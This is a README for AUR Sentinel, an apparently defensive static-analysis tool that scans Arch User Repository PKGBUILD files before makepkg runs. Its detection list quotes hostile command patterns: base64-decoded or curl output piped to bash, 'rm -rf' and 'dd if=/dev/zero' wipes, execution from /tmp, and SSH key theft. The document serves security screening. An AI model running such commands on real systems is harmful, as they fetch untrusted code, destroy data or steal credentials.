# AUR Sentinel

A static analysis tool designed to scan Arch User Repository (AUR) `PKGBUILD` files for malicious payloads, obfuscated code, and security risks. 

It provides a focused security signal before `makepkg`; it does not guarantee that a package is safe.

## Why?
The AUR is community-driven. While most packages are safe, malicious actors occasionally upload PKGBUILDs containing cryptominers, reverse shells, or `rm -rf /*` payloads. AUR Sentinel catches them *before* you run `makepkg`.

## Detection Capabilities
* Base64 Obfuscation (`echo "..." | base64 -d | bash`)
* Malicious external binary fetching (`curl -s http://unknown-ip | bash`)
* System destruction commands (`rm -rf`, `dd if=/dev/zero`)
* Execution from `/tmp` or `/dev/shm`
* SSH Key stealing attempts

## Usage
```bash
uv sync
uv run aur-sentinel scan ./PKGBUILD
```

The command returns a risk score from 0 to 100 and reports the matching source lines. It never executes the scanned file.

## Current milestone

The initial rule set detects direct pipe-to-shell downloads, Base64 execution, destructive root deletion, SSH key access, and execution from shared memory. Future milestones can fetch AUR snapshots, inspect `.SRCINFO`, verify source hashes, and export machine-readable reports.

## Limitations

Static signatures can produce false positives and false negatives. Review every `PKGBUILD`, upstream source, maintainer history, and package comments before installation.
